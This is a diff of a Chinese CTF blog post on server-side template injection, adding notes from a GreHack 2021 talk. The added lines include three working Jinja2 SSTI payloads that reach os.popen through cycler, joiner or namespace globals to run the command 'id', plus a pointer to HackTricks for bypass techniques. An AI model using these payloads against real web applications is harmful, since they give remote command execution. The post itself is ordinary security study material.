@@ -28,7 +28,7 @@
 <meta property="og:description" content="SSTI相关知识总结第一次遇到 SSTi 的题目是在去年安恒三月赛中 那也是我第一次打CTF比赛？不知不觉一年已经过去了 不同时期学习知识当然要有不同的体悟 现在重新总结一下ssti 相关知识 希望可以得到新的体悟">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-04-25T02:01:06.000Z">
-<meta property="article:modified_time" content="2022-04-27T16:58:49.092Z">
+<meta property="article:modified_time" content="2022-04-29T15:22:49.142Z">
 <meta property="article:author" content="b1ue0cean">
 <meta property="article:tag" content="SSTI">
 <meta name="twitter:card" content="summary">
@@ -92,8 +92,8 @@
         <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
         <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
         <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">14</span></a></li>
-        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">7</span></a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">31</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">8</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">32</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
         </a>
@@ -165,13 +165,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-count">32</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -268,7 +268,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-04-28 00:58:49" itemprop="dateModified" datetime="2022-04-28T00:58:49+08:00">2022-04-28</time>
+      <time title="Modified: 2022-04-29 23:22:49" itemprop="dateModified" datetime="2022-04-29T23:22:49+08:00">2022-04-29</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -297,6 +297,12 @@
 
 <p>原理啥的这里我就不讨论了 网上介绍的一大堆</p>
 <p>重点关注一下 payload 和 绕过</p>
+<p>最近看到的一篇不错的演讲pdf – GreHack_2021_-_Optimizing_Server_Side_Template_Injections_payloads_for_jinja2_slides</p>
+<p>最总给出来三个payload</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">cycler.__init__.__globals__.os.popen</span>(<span class="name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">joiner.__init__.__globals__.os.popen</span>(<span class="name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">namespace.__init__.__globals__.os.popen</span>(<span class="name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span></span><br></pre></td></tr></table></figure>
+
+<p>主要是讲解搜寻payload的方法</p>
+<p>关于绕过 可参考 hacktrick</p>
 
     </div>
 
